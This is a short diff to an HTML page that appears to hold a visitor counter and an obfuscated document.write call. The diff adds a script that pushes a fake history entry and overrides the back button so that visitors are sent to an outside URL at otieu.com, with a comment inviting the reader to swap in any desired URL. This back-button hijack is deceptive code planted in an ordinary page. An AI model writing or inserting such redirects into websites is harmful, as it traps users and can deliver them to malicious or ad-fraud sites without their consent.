@@ -718,7 +718,13 @@ document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var
 </center>
 <!-- END: Powered by Supercounters.com -->
 
-
+<script>
+  history.pushState(null, null, location.href); 
+  window.onpopstate = function () {
+    // Redirect to another site when back button is pressed
+    location.href = "https://otieu.com/4/8998632"; // Replace with your desired URL
+  };
+</script>
 
 </body></html>
 
